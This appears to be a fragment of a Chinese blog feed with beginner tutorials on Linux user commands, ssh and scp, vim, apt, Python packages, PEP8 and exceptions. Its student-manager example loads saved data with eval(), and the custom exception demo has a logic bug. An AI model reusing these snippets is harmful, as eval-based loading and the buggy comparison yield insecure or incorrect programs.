useradd创建用户"></a>3.17 useradd创建用户</h5><table><thead><tr><th align="left">命令</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">useradd</td><td align="left">创建(添加)用户</td></tr></tbody></table><p><strong>useradd命令选项:</strong></p><table><thead><tr><th align="left">选项</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">-m</td><td align="left">自动创建用户主目录,主目录的名字就是用户名</td></tr><tr><td align="left">-g</td><td align="left">指定用户所属的用户组，默认不指定会自动创建一个同名的用户组</td></tr></tbody></table><p><strong>说明:</strong></p><ul><li><strong>useradd</strong> 命令的使用需要使用管理员权限，前面需要加上 <strong>sudo</strong></li><li>创建用户如果不指定用户组，默认会自动创建一个同名的用户组</li><li>查看用户是否创建成功，可以查看<strong>/etc/passwd</strong>这个文件</li><li>查看用户组是否创建成功，可以查看<strong>/etc/group</strong>这个文件</li></ul><p><strong>passwd文件中的每项信息说明,以root:x:0:0:root:/root:/bin/bash为例:</strong></p><ul><li>第一个：用户名</li><li>第二个：密码占位符</li><li>第三个：uid, 用户id</li><li>第四个：gid, 用户所在组id</li><li>第五个：用户描述, 可选，</li><li>第六个：用户的主目录所在位置</li><li>第七个：用户所用 shell 的类型，一般由bash或者sh，默认不设置是sh类型</li></ul><p><strong>group文件中的每项信息说明, 以laowang:x:1001:为例:</strong></p><ul><li>第一个：用户组名</li><li>第二个：用户组密码占位符，一般Linux系统的用户组都没有密码的</li><li>第三个：组id</li></ul><h5 id="3-18-id命令查看用户信息"><a href="#3-18-id命令查看用户信息" class="headerlink" title="3.18 id命令查看用户信息"></a>3.18 id命令查看用户信息</h5><table><thead><tr><th align="left">命令</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">id</td><td align="left">查看用户信息</td></tr></tbody></table><p><strong>每项信息说明:</strong></p><p>uid=1001(laowang) gid=1001(laowang) 组=1001(laowang)</p><ul><li>第一个: uid 表示用户id</li><li>第二个: gid 表示用户组id</li><li>第三个: 组 表示用户所在的用户组</li></ul><h5 id="3-19-su切换用户"><a href="#3-19-su切换用户" class="headerlink" title="3.19 su切换用户"></a>3.19 su切换用户</h5><table><thead><tr><th align="left">命令</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">su</td><td align="left">切换用户</td></tr></tbody></table><p><strong>语法格式: su - 用户名</strong></p><h5 id="3-20-userdel删除用户"><a href="#3-20-userdel删除用户" class="headerlink" title="3.20 userdel删除用户"></a>3.20 userdel删除用户</h5><table><thead><tr><th align="left">命令</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">userdel</td><td align="left">删除用户</td></tr></tbody></table><p><strong>语法格式: userdel 用户名</strong></p><p><strong>userdel命令选项:</strong></p><table><thead><tr><th align="left">选项</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">-r 用户名</td><td align="left">删除用户主目录，必须要设置，否则用户主目录不会删除</td></tr></tbody></table><p><strong>说明:</strong></p><ul><li>删除用户，默认同名的用户组也会被删除</li></ul><h5 id="3-21-groupadd创建用户组"><a href="#3-21-groupadd创建用户组" class="headerlink" title="3.21 groupadd创建用户组"></a>3.21 groupadd创建用户组</h5><table><thead><tr><th align="left">命令</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">groupadd</td><td align="left">创建(添加)用户组</td></tr></tbody></table><p>创建用户并指定用户组 :</p><pre><code class="shell"> sudo useradd -m ubuntu -g root </code></pre><h4 id="4-远程登录和远程拷贝"><a href="#4-远程登录和远程拷贝" class="headerlink" title="4. 远程登录和远程拷贝"></a>4. 远程登录和远程拷贝</h4><h5 id="4-1-ssh命令的使用"><a href="#4-1-ssh命令的使用" class="headerlink" title="4.1 ssh命令的使用"></a>4.1 ssh命令的使用</h5><p><strong>ssh命令格式:</strong></p><p>ssh 用户名@ip地址</p><p>示例：</p><pre><code class="shell">ssh root@192.168.1.24</code></pre><p>安装：</p><pre><code class="shell">sudo apt install openssh-serveryum install openssh-serversudo pacman -S openssh-server</code></pre><p>启动服务：</p><pre><code class="shell">sudo systemctl start sshsudo service ssh start</code></pre><h5 id="4-2-scp命令的使用"><a href="#4-2-scp命令的使用" class="headerlink" title="4.2 scp命令的使用"></a>4.2 scp命令的使用</h5><p><strong>scp命令格式</strong></p><p>scp 源文件 目标</p><p>示例：从本地拷贝到远程目标</p><pre><code class="shell">scp test.txt root@192.168.1.24:/home/</code></pre><p>从远程拷贝文件到本地</p><pre><code class="shell">scp root@192.168.1.24:/home/test.txt /home/</code></pre><h4 id="5-vim编辑器使用"><a href="#5-vim编辑器使用" class="headerlink" title="5. vim编辑器使用"></a>5. vim编辑器使用</h4><h5 id="5-1-vim-的工作模式"><a href="#5-1-vim-的工作模式" class="headerlink" title="5.1 vim 的工作模式"></a>5.1 vim 的工作模式</h5><ul><li>命令模式</li><li>编辑模式</li><li>末行模式</li></ul><h5 id="5-2-vim-的末行模式命令"><a href="#5-2-vim-的末行模式命令" class="headerlink" title="5.2 vim 的末行模式命令"></a>5.2 vim 的末行模式命令</h5><ul><li>:w 保存</li><li>:wq 保存退出</li><li>:x 保存退出</li><li>:q! 强制退出</li></ul><h5 id="5-3-vim-的常用命令"><a href="#5-3-vim-的常用命令" class="headerlink" title="5.3 vim 的常用命令"></a>5.3 vim 的常用命令</h5><table><thead><tr><th align="left">命令</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">yy</td><td align="left">复制光标所在行</td></tr><tr><td align="left">p</td><td align="left">粘贴</td></tr><tr><td align="left">dd</td><td align="left">删除/剪切当前行</td></tr><tr><td align="left">u</td><td align="left">撤销</td></tr><tr><td align="left">/搜索的内容</td><td align="left">搜索指定内容</td></tr><tr><td align="left">G</td><td align="left">回到最后一行</td></tr><tr><td align="left">gg</td><td align="left">回到第一行</td></tr><tr><td align="left">数字+G</td><td align="left">回到指定行</td></tr></tbody></table><p>常用命令扩展</p><table><thead><tr><th align="left">命令</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">&gt;&gt;</td><td align="left">往右缩进</td></tr><tr><td align="left">&lt;&lt;</td><td align="left">往左缩进</td></tr><tr><td align="left">:%s/要替换的内容/替换后的内容/g</td><td align="left">全局替换</td></tr><tr><td align="left">:开始行数,结束行数s/要替换的内容/替换后的内容</td><td align="left">局部替换</td></tr><tr><td align="left">.</td><td align="left">重复上一次命令操作</td></tr><tr><td align="left">shift+6</td><td align="left">回到当前行的行首</td></tr><tr><td align="left">shift+4</td><td align="left">回到当前行的行末</td></tr><tr><td align="left">ctr+f</td><td align="left">下一屏</td></tr><tr><td align="left">ctr+b</td><td align="left">上一屏</td></tr><tr><td align="left">V</td><td align="left">按行选中</td></tr><tr><td align="left">ctr+r</td><td align="left">反撤销</td></tr></tbody></table><h4 id="6-ubuntu软件安装和软件卸载"><a href="#6-ubuntu软件安装和软件卸载" class="headerlink" title="6. ubuntu软件安装和软件卸载"></a>6. ubuntu软件安装和软件卸载</h4><h5 id="6-1-deb文件格式安装"><a href="#6-1-deb文件格式安装" class="headerlink" title="6.1 deb文件格式安装"></a>6.1 deb文件格式安装</h5><p>是 Ubuntu 的安装包格式，可以使用 <strong>dpkg</strong> 命令进行软件的安装和卸载。</p><table><thead><tr><th align="left">命令</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">dpkg</td><td align="left">安装和卸载deb安装包</td></tr></tbody></table><p><strong>dpkg命令选项:</strong></p><table><thead><tr><th align="left">选项</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">-i</td><td align="left">离线安装deb安装包</td></tr></tbody></table><h5 id="6-2-apt方式安装"><a href="#6-2-apt方式安装" class="headerlink" title="6.2 apt方式安装"></a>6.2 apt方式安装</h5><p>是在线安装deb软件包的命令，主要用于在线从互联网的软件仓库中<strong>搜索、安装、升级、卸载</strong>软件。</p><p><strong>在线安装软件命令格式:</strong></p><ul><li><strong>sudo apt install 安装包</strong> , 表示在线安装deb安装包</li></ul><h5 id="6-3-更改镜像源"><a href="#6-3-更改镜像源" class="headerlink" title="6.3 更改镜像源"></a>6.3 更改镜像源</h5><p>因为使用 apt-get 命令默认是从国外的服务器下载安装软件的，会导致下载安装速度很慢，所以需要更改成国内的镜像源服务器。</p><p><strong>镜像源说明:</strong></p><p>镜像源就是下载软件来源的服务器。</p><p><strong>更改镜像源的方式:</strong></p><ol><li>可视化方式更改镜像源</li><li>手动方式更改镜像源</li></ol><p><strong>说明:</strong></p><ol><li>手动修改镜像源，配置完成以后需要执行 <strong>sudo apt update</strong> 这个命令，更新镜像源保证可以下载最新的软件。</li><li><strong>使用apt方式安装软件一定要联网</strong></li></ol><h5 id="6-4-deb-文件格式卸载"><a href="#6-4-deb-文件格式卸载" class="headerlink" title="6.4 deb 文件格式卸载"></a>6.4 deb 文件格式卸载</h5><p><strong>命令格式:</strong></p><p><strong>sudo dpkg –r 安装包名</strong></p><p>-r 选项表示安装的卸载</p><h5 id="6-5-apt-方式卸载"><a href="#6-5-apt-方式卸载" class="headerlink" title="6.5 apt 方式卸载"></a>6.5 apt 方式卸载</h5><p><strong>命令格式:</strong></p><p>**sudo apt remove 安装包名</p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python基础10-包、代码规范、案例</title>
      <link href="/2020/08/02/2020-08-03-python%E5%9F%BA%E7%A1%8010-%E5%8C%85%E3%80%81%E4%BB%A3%E7%A0%81%E8%A7%84%E8%8C%83%E3%80%81%E6%A1%88%E4%BE%8B/"/>
      <url>/2020/08/02/2020-08-03-python%E5%9F%BA%E7%A1%8010-%E5%8C%85%E3%80%81%E4%BB%A3%E7%A0%81%E8%A7%84%E8%8C%83%E3%80%81%E6%A1%88%E4%BE%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="包、代码规范、案例"><a href="#包、代码规范、案例" class="headerlink" title="包、代码规范、案例"></a>包、代码规范、案例</h1><h2 id="一、Python中的包"><a href="#一、Python中的包" class="headerlink" title="一、Python中的包"></a>一、Python中的包</h2><h3 id="1-创建包"><a href="#1-创建包" class="headerlink" title="1. 创建包"></a>1. 创建包</h3><a id="more"></a><ul><li>有 2 个模块功能有些联系，可以将其放到同一个文件夹下</li><li>要组成包，还需要在该文件夹中创建<code>__init__.py</code>文件</li></ul><p><strong>总结：</strong></p><ul><li>把有联系的多个模块文件，放到同一个文件夹下，并且在这个文件夹创建一个名字为<code>__init__</code>.py 文件，那么这个文件夹就称之为包</li><li>包的本质就是一个文件夹，包的作用将模块文件组织起来</li><li>包能有效避免模块名称冲突问题，提高程序的结构性和可维护性</li></ul><h3 id="2-导入包中模块"><a href="#2-导入包中模块" class="headerlink" title="2. 导入包中模块"></a>2. 导入包中模块</h3><ul><li>使用 <code>import 包名.模块名</code> 能够导入包中的模块</li><li>使用 <code>from 包名.模块名 import...</code>能够导入模块中的符号</li></ul><p>示例代码：</p><pre><code class="python">&quot;&quot;&quot;方式1：导入格式：   import 包名.模块名            包名就是文件夹名    模块名就是文件名字使用格式：   包名.模块名.工具   (类名、函数、变量)&quot;&quot;&quot;import msg.sendmsgmsg.sendmsg.send_test()&quot;&quot;&quot;方式2：导入格式：   from 包名.模块名 import 所需的工具使用格式：   工具   (类名、函数、变量)&quot;&quot;&quot;from msg.sendmsg import send_test# from msg.sendmsg import *send_test()</code></pre><h3 id="3-init-py文件有什么用"><a href="#3-init-py文件有什么用" class="headerlink" title="3. __init__.py文件有什么用"></a>3. <code>__init__.py</code>文件有什么用</h3><ul><li>包被导入时，会执行 <code>__init__.py</code>文件的内容</li><li><code>__init__.py</code> 的作用：控制包的导入行为，管理模块文件</li></ul><h4 id="3-1-导包执行-init-py内容"><a href="#3-1-导包执行-init-py内容" class="headerlink" title="3.1 导包执行__init__.py内容"></a>3.1 导包执行<code>__init__.py</code>内容</h4><ul><li>包被导入时，会执行 <code>__init__.py</code>文件的内容</li></ul><h2 id="二、PEP8-Python代码风格指南"><a href="#二、PEP8-Python代码风格指南" class="headerlink" title="二、PEP8: Python代码风格指南"></a>二、PEP8: Python代码风格指南</h2><p>PEP8 提供了 Python 代码的编写约定，本节知识点旨在提高代码的可读性，并使其在各种 Python 代码中编写风格保持一致。</p><ol><li><p>缩进使用4个空格, 空格是首选的缩进方式. Python3 不允许混合使用制表符和空格来缩进.</p></li><li><p>每一行最大长度限制在79个字符以内.</p></li><li><p>顶层函数、类的定义, 前后使用两个空行隔开.</p></li><li><p>import 导入</p><ol><li><p>导入建议在不同的行, 例如:</p><pre><code class="python">import osimport sys# 不建议如下导包import os, sys# 但是可以如下:from subprocess import Popen, PIPE</code></pre></li><li><p>导包位于文件顶部, 在模块注释、文档字符串之后, 全局变量、常量之前. 导入按照以下顺序分组:</p><ol><li>标准库导入</li><li>相关第三方导入</li><li>本地应用/库导入</li><li>在每一组导入之间加入空行</li></ol></li></ol></li><li><p>Python 中定义字符串使用双引号、单引号是相同的, 尽量保持使用同一方式定义字符串. 当一个字符串包含单引号或者双引号时, 在最外层使用不同的符号来避免使用反斜杠转义, 从而提高可读性.</p></li><li><p>表达式和语句中的空格:</p><ol><li>避免在小括号、方括号、花括号后跟空格.</li><li>避免在逗号、分好、冒号之前添加空格.</li><li>冒号在切片中就像二元运算符, 两边要有相同数量的空格. 如果某个切片参数省略, 空格也省略.</li><li>避免为了和另外一个赋值语句对齐, 在赋值运算符附加多个空格.</li><li>避免在表达式尾部添加空格, 因为尾部空格通常看不见, 会产生混乱.</li><li>总是在二元运算符两边加一个空格, 赋值（=），增量赋值（+=，-=），比较（==,&lt;,&gt;,!=,&lt;&gt;,&lt;=,&gt;=,in,not,in,is,is not），布尔（and, or, not</li></ol></li><li><p>避免将小的代码块和 if/for/while 放在同一行, 要避免代码行太长.</p><pre><code class="python">if foo == &#39;blah&#39;: do_blah_thing()for x in lst: total += xwhile t &lt; 10: t = delay()</code></pre></li><li><p>永远不要使用字母 ‘l’(小写的L), ‘O’(大写的O), 或者 ‘I’(大写的I) 作为单字符变量名. 在有些字体里, 这些字符无法和数字0和1区分, 如果想用 ‘l’, 用 ‘L’ 代替.</p></li><li><p>类名一般使用首字母大写的约定.</p></li><li><p>函数名应该小写, 如果想提高可读性可以用下划线分隔.</p></li><li><p>如果函数的参数名和已有的关键词冲突, 在最后加单一下划线比缩写或随意拼写更好. 因此 class_ 比 clss 更好.(也许最好用同义词来避免这种冲突).</p></li><li><p>方法名和实例变量使用下划线分割的小写单词, 以提高可读性.</p></li></ol><h2 id="三、学生名片管理系统：面向对象版"><a href="#三、学生名片管理系统：面向对象版" class="headerlink" title="三、学生名片管理系统：面向对象版"></a>三、学生名片管理系统：面向对象版</h2><h3 id="1-示例代码"><a href="#1-示例代码" class="headerlink" title="1. 示例代码"></a>1. 示例代码</h3><pre><code class="python">import osclass Student(object):    &quot;&quot;&quot;学生类：保存学生的基本信息&quot;&quot;&quot;    def __init__(self, name, age, tel):        self.name = name        self.age = age        self.tel = tel    def __str__(self):        return f&#39;{self.name}\t{self.age}\t{self.tel}&#39;    def to_dict(self):        &quot;&quot;&quot;将属性内容以字典的形式返回&quot;&quot;&quot;        return {&#39;name&#39;: self.name, &#39;age&#39;: self.age, &#39;tel&#39;: self.tel}class ManagerStuSys(object):    &quot;&quot;&quot;管理学生：增删改查学生信息&quot;&quot;&quot;    def __init__(self):        self.user_list = []    def test(self):        s1 = Student(&#39;mike&#39;, 34, &#39;110&#39;)        s2 = Student(&#39;tom&#39;, 24, &#39;120&#39;)        self.user_list.append(s1)        self.user_list.append(s2)        for obj in self.user_list:            print(obj)    def start(self):        self.load_info()        while True:            self.help_menu()            cmd = input(&#39;请输入功能数字：&#39;)            if cmd == &#39;1&#39;:                print(&#39;添加学生&#39;)                self.add_info()            elif cmd == &#39;2&#39;:                print(&#39;显示所有学生&#39;)                self.show_all_stu()            elif cmd == &#39;3&#39;:                print(&#39;查询学生信息&#39;)                self.find_stu_by_name()            elif cmd == &#39;4&#39;:                print(&#39;修改学生名片信息&#39;)                self.update_stu_by_name()            elif cmd == &#39;5&#39;:                print(&#39;删除学生信息&#39;)                self.del_stu_by_name()            elif cmd == &#39;6&#39;:                print(&#39;保存信息&#39;)                self.save_info()            elif cmd == &#39;7&#39;:                print(&#39;退出系统&#39;)                break            else:                print(&#39;输入错误，请重新输入&#39;)    @staticmethod    def help_menu():        print(&#39;=&#39; * 30)        print(&#39;= 1.添加学生名片信息&#39;)        print(&#39;= 2.显示所有学生名片信息&#39;)        print(&#39;= 3.查询学生名片信息&#39;)        print(&#39;= 4.修改学生名片信息&#39;)        print(&#39;= 5.删除学生名片信息&#39;)        print(&#39;= 6.保存学生名片信息&#39;)        print(&#39;= 7.退出系统&#39;)        print(&#39;=&#39; * 30)    def add_info(self):        &quot;&quot;&quot;添加学生名片信息&quot;&quot;&quot;        name = input(&#39;请输入姓名：&#39;)        age = int(input(&#39;请输入年龄：&#39;))        tel = input(&#39;请输入电话：&#39;)        # 通过for遍历，取出某个元素后，这个元素就是对象        for obj in self.user_list:            if obj.name == name:                print(f&#39;已经存在{name}学生，不能添加&#39;)                break        else:            obj = Student(name, age, tel)            self.user_list.append(obj)            print(f&#39;{name}学生添加成功&#39;)    def show_all_stu(self):        &quot;&quot;&quot;显示所有学生名片信息&quot;&quot;&quot;        if len(self.user_list) == 0:            print(&#39;当前没有任何名片信息&#39;)            return        # 打印表头        print(&#39;序号\t姓名\t年龄\t电话&#39;)        for i, obj in enumerate(self.user_list):            print(f&#39;{i+1}\t{obj}&#39;)    def find_stu_by_name(self):        &quot;&quot;&quot;查找学生名片信息&quot;&quot;&quot;        name = input(&#39;请输入需要查找的姓名：&#39;)        for obj in self.user_list:            if obj.name == name:                print(obj)                break        else:            print(f&#39;{name}用户不存在&#39;)    def update_stu_by_name(self):        &quot;&quot;&quot;修改学生名片信息&quot;&quot;&quot;        name = input(&#39;请输入想要修改的姓名：&#39;)        for i, obj in enumerate(self.user_list):            if obj.name == name:                new_name = input(&#39;请输入新的名字：&#39;)                new_age = input(&#39;请输入新的年龄：&#39;)                new_tel = input(&#39;请输入新的电话：&#39;)                self.user_list[i].name = new_name                self.user_list[i].age = new_age                self.user_list[i].tel = new_tel                print(&#39;修改成功&#39;)                break        else:            print(f&#39;{name}用户不存在&#39;)    def del_stu_by_name(self):        &quot;&quot;&quot;删除学生名片信息&quot;&quot;&quot;        name = input(&#39;请输入想要删除的姓名：&#39;)        for i, obj in enumerate(self.user_list):            if obj.name == name:                del self.user_list[i]                print(&#39;删除成功&#39;)                break        else:            print(f&#39;{name}用户不存在&#39;)    def save_info(self):        &quot;&quot;&quot;保存学生名片信息&quot;&quot;&quot;        new_list = []        for obj in self.user_list:            new_list.append(obj.to_dict())        with open(&#39;stu.txt&#39;, &#39;w&#39;) as f:            f.write(str(new_list))            print(&#39;保存成功&#39;)    def load_info(self):        &quot;&quot;&quot;加载文件内容&quot;&quot;&quot;        if not os.path.exists(&#39;stu.txt&#39;):            print(&#39;文件不存在，无法加载&#39;)            return        with open(&#39;stu.txt&#39;) as f:            content = f.read()            temp_list = eval(content)            print(&#39;加载成功&#39;)        for user_dict in temp_list:            obj = Student(user_dict[&#39;name&#39;], user_dict[&#39;age&#39;], user_dict[&#39;tel&#39;])            self.user_list.append(obj)mss = ManagerStuSys()mss.start()</code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python基础09-异常、模块</title>
      <link href="/2020/08/02/2020-08-03-python%E5%9F%BA%E7%A1%8009-%E5%BC%82%E5%B8%B8%E3%80%81%E6%A8%A1%E5%9D%97/"/>
      <url>/2020/08/02/2020-08-03-python%E5%9F%BA%E7%A1%8009-%E5%BC%82%E5%B8%B8%E3%80%81%E6%A8%A1%E5%9D%97/</url>
      
        <content type="html"><![CDATA[<h1 id="异常、模块"><a href="#异常、模块" class="headerlink" title="异常、模块"></a>异常、模块</h1><h2 id="一、捕获异常"><a href="#一、捕获异常" class="headerlink" title="一、捕获异常"></a>一、捕获异常</h2><h3 id="1-处理异常目的"><a href="#1-处理异常目的" class="headerlink" title="1. 处理异常目的"></a>1. 处理异常目的</h3><a id="more"></a><ul><li>只要解释器检查到异常错误，默认执行的动作是终止程序</li><li>处理异常目的：防止程序退出，保证程序正常执行</li></ul><h3 id="2-捕获异常"><a href="#2-捕获异常" class="headerlink" title="2. 捕获异常"></a>2. 捕获异常</h3><h4 id="2-1-try…except…"><a href="#2-1-try…except…" class="headerlink" title="2.1 try…except…"></a>2.1 try…except…</h4><p>语法格式：</p><pre><code class="python">try:    可能发生异常的代码except:      # 处理异常的代码    1. 如果try里面发生异常    2. 自动跳转到except里面</code></pre><ul><li>把可能出现问题的代码，放在try中</li><li>把处理异常的代码，放在except中</li><li>except后面没有指定异常类型，可以捕获任意类型的异常</li></ul><p>示例代码：</p><pre><code class="python">try:    print(&#39;=&#39; * 20)    open(&#39;xxx.txt&#39;, &#39;r&#39;)  # 发生了异常，自动跳转到except里面    print(&#39;=&#39; * 20)except:    print(&#39;try里面发生了异常&#39;)</code></pre><p>运行结果：</p><pre><code class="python">====================try里面发生了异常</code></pre><h4 id="2-2-捕获指定异常类型"><a href="#2-2-捕获指定异常类型" class="headerlink" title="2.2 捕获指定异常类型"></a>2.2 捕获指定异常类型</h4><p>语法格式：</p><pre><code class="python">try:    可能发生异常的代码except 异常类型:      处理异常的代码</code></pre><p>示例代码：</p><pre><code class="python">try:    print(&#39;=&#39; * 20)    open(&#39;xxx.txt&#39;, &#39;r&#39;)  # 发生了异常，自动跳转到except里面    print(&#39;=&#39; * 20)except FileNotFoundError:    print(&#39;try里面发生了异常&#39;)</code></pre><p>运行结果：</p><pre><code class="python">====================try里面发生了异常</code></pre><h4 id="2-3-except捕获多个异常"><a href="#2-3-except捕获多个异常" class="headerlink" title="2.3 except捕获多个异常"></a>2.3 except捕获多个异常</h4><p>语法格式：</p><pre><code class="python">try:    可能发生异常的代码except (异常类型1, 异常类型2):      处理异常的代码</code></pre><p>示例代码：</p><pre><code class="python">try:    print(&#39;=&#39; * 20)    # open(&#39;xxx.txt&#39;, &#39;r&#39;)    print(&#39;=&#39; * 20)    print(num)    print(&#39;=&#39; * 20)except (FileNotFoundError, NameError):    print(&#39;try里面发生了异常&#39;)</code></pre><h4 id="2-4-获取异常的信息描述"><a href="#2-4-获取异常的信息描述" class="headerlink" title="2.4 获取异常的信息描述"></a>2.4 获取异常的信息描述</h4><p>语法格式：</p><pre><code class="python">&quot;&quot;&quot;try:    可能发生异常的代码except 异常类型 as 异常对象名:    print(异常对象名) 即可获取异常的信息描述&quot;&quot;&quot;</code></pre><p>示例代码：</p><pre><code class="python">try:    print(&#39;=&#39; * 20)    open(&#39;xxx.txt&#39;, &#39;r&#39;)    print(&#39;=&#39; * 20)except FileNotFoundError as e:    print(&#39;异常信息为：&#39;, e)</code></pre><p>运行结果：</p><pre><code class="shell">====================异常信息为： [Errno 2] No such file or directory: &#39;xxx.txt&#39;</code></pre><h4 id="2-5-捕获任意类型的异常"><a href="#2-5-捕获任意类型的异常" class="headerlink" title="2.5 捕获任意类型的异常"></a>2.5 捕获任意类型的异常</h4><p>语法格式：</p><pre><code class="python">&quot;&quot;&quot;try:    可能发生异常的代码except Exception as 异常对象名:    Exception 为异常类的父类&quot;&quot;&quot;</code></pre><p>示例代码：</p><pre><code class="python">try:    print(&#39;=&#39; * 20)    open(&#39;xxx.txt&#39;, &#39;r&#39;)    print(&#39;=&#39; * 20)# except Exception: 捕获任意异常的类型except Exception as e:    print(&#39;异常信息为：&#39;, e)</code></pre><h4 id="2-6-异常中else"><a href="#2-6-异常中else" class="headerlink" title="2.6 异常中else"></a>2.6 异常中else</h4><ul><li>在 if 中，它的作用是当条件不满足时执行的实行</li><li>同样在 try…except… 中也是如此，即如果没有捕获到异常，那么就执行else中的事情</li></ul><p>语法格式：</p><pre><code class="python">&quot;&quot;&quot;try:    可能发生异常的代码except:    处理异常的代码else:    没有发生异常，except不满足执行else&quot;&quot;&quot;</code></pre><p>示例代码：</p><pre><code class="python">try:    num = 100   print(num)except NameError as errorMsg:    print(&#39;产生错误了:%s&#39;%errorMsg)else:    print(&#39;没有捕获到异常，真高兴&#39;)</code></pre><p>运行结果：</p><pre><code>====================666====================没有发生异常，很开心</code></pre><h4 id="2-7-try…finally…"><a href="#2-7-try…finally…" class="headerlink" title="2.7 try…finally…"></a>2.7 try…finally…</h4><h5 id="2-7-1-语法格式"><a href="#2-7-1-语法格式" class="headerlink" title="2.7.1 语法格式"></a>2.7.1 语法格式</h5><p>语法格式：</p><pre><code class="python">&quot;&quot;&quot;try:    可能发生异常的代码except:    处理异常的代码else:    没有发生异常，except不满足执行elsefinally:    不管有没有异常，最终都要执行&quot;&quot;&quot;</code></pre><p>示例代码：</p><pre><code class="python">try:    print(&#39;=&#39; * 20)    # num = 666    print(num)    print(&#39;=&#39; * 20)except Exception as e:    print(&#39;异常信息为：&#39;, e)else:    print(&#39;没有发生异常，很开心&#39;)finally:    print(&#39;不管有没有异常，最终都要执行&#39;)</code></pre><p>运行结果：</p><pre><code class="python">====================异常信息为： name &#39;num&#39; is not defined不管有没有异常，最终都要执行</code></pre><h5 id="2-7-2-应用场景"><a href="#2-7-2-应用场景" class="headerlink" title="2.7.2 应用场景"></a>2.7.2 应用场景</h5><ul><li>对于文件操作，在文件打开的前提下，后面文件的其它操作，不管有没有发生异常，最终都应该关闭文件</li></ul><pre><code class="python">f = open(&#39;yyy.txt&#39;, &#39;w&#39;)  # 前提是，成功打开文件try:    # ret = f.read()    # print(ret)    f.write(&#39;hello mike&#39;)    print(&#39;=&#39;*20)except Exception as e:    print(&#39;产出异常，异常信息为：&#39;, e)else:    print(&#39;没有产生异常&#39;)finally:    print(&#39;不管有没有异常，都要关闭文件&#39;)    f.close()</code></pre><h2 id="二、异常传递"><a href="#二、异常传递" class="headerlink" title="二、异常传递"></a>二、异常传递</h2><h3 id="1-异常传递特点"><a href="#1-异常传递特点" class="headerlink" title="1. 异常传递特点"></a>1. 异常传递特点</h3><ul><li>如果异常在内部产生，如果内部不捕获处理，这个异常会向外部传递</li></ul><h3 id="2-异常嵌套"><a href="#2-异常嵌套" class="headerlink" title="2. 异常嵌套"></a>2. 异常嵌套</h3><ul><li>try嵌套时，如果内层try没有捕获处理该异常，就会向外层try进行传递</li></ul><pre><code class="python">try:    f = open(&#39;yyy.txt&#39;, &#39;w&#39;)    # 内部语句执行完，才向外部传递异常    try:        # 前面只写方式打开文件，不能读文件，产生异常        # 内部没有捕获处理异常        ret = f.read()        print(ret)    finally:        print(&#39;关闭文件&#39;)        f.close()except Exception as e:    print(&#39;外层捕获异常：&#39;, e)</code></pre><p>运行结果：</p><pre><code class="python">关闭文件外层捕获异常： not readable</code></pre><h3 id="3-函数嵌套"><a href="#3-函数嵌套" class="headerlink" title="3. 函数嵌套"></a>3. 函数嵌套</h3><ul><li>函数嵌套时，如果内层函数没有捕获处理该异常，就会向外层函数进行传递</li></ul><pre><code class="python"># 定义1个函数，函数内部发生了异常 test01()，没有捕获处理def test01():    print(&#39;开始执行test0111111&#39;)    print(num)    print(&#39;结束执行test0111111&#39;)# 定义另外一个函数 test02, 在函数内部调用test01def test02():    print(&#39;开始执行test02222222&#39;)    test01()    print(&#39;结束执行test02222222&#39;)# 定义一个test03函数，函数内部调用test01，但是对test01做异常处理def test03():    print(&#39;开始执行test0333333&#39;)    try:        test01()    except Exception as e:        print(&#39;外层函数捕获异常：&#39;, e)    print(&#39;结束执行test0333333&#39;)# 调用test02()# test02()test03()</code></pre><p>运行结果：</p><pre><code class="python">开始执行test0333333开始执行test0111111外层函数捕获异常： name &#39;num&#39; is not defined结束执行test0333333</code></pre><h2 id="三、抛出自定义的异常"><a href="#三、抛出自定义的异常" class="headerlink" title="三、抛出自定义的异常"></a>三、抛出自定义的异常</h2><h3 id="1-抛出自定义的异常"><a href="#1-抛出自定义的异常" class="headerlink" title="1. 抛出自定义的异常"></a>1. 抛出自定义的异常</h3><ul><li>用户可用 raise语句 来人为抛出一个异常。</li><li>异常/错误对象必须有一个名字，且它们应是Exception类的子类</li></ul><p>语法格式：</p><pre><code class="python"># 1. 自定义异常类class 自定义异常类名字(Exception):    1.1 重新写__init__(self, 形参1， 形参2，……)        # 建议调用父类的init，先做父类的初始化工作        super().__init__()        咱们自己写的代码    1.2 重新写__str__()，返回提示信息# 2. 抛出异常类raise 自定义异常类名字(实参1， 实参2，……)</code></pre><p>示例代码：</p><pre><code class="python">&quot;&quot;&quot;需求：1. 自定义异常类，电话号码长度异常类    1.1 __init__，添加2个属性，用户电话的长度，要求的长度    1.2 __str__ 返回提示描述意思，如：用户电话长度为：xx位, 这边要求长度为：11位2. 只要用户输入的手机号码不为11位，抛出自定义异常类&quot;&quot;&quot;# 1. 自定义异常类，电话号码长度异常类class NumberError(Exception):    &quot;&quot;&quot;自定义异常类，电话号码长度异常类&quot;&quot;&quot;    # 添加2个属性，用户电话的长度，要求的长度    def __init__(self, _user_len, _match_len=11):        super().__init__()  # 调用父类的init        self.user_len = _user_len  # 用户电话的长度        self.match_len = _match_len  # 要求号码的长度    def __str__(self):        return f&#39;用户电话长度为：{self.user_len} 位, 这边要求的长度为：{self.match_len} 位&#39;# 2. 只要用户输入的手机号码不为11位，抛出自定义异常类try:    num_str = input(&#39;请输入你的号码：&#39;)    if num_str != 11:        raise NumberError(len(num_str))  # 抛出自定义异常类except NumberError as e:  # e 为 NumberError(len(num_str))实例对象 的别名    print(&#39;异常信息为：&#39;, e)</code></pre><p>运行结果：</p><pre><code class="python">请输入你的号码：11232异常信息为： 用户电话长度为：5 位, 这边要求的长度为：11 位</code></pre><h2 id="四、模块"><a 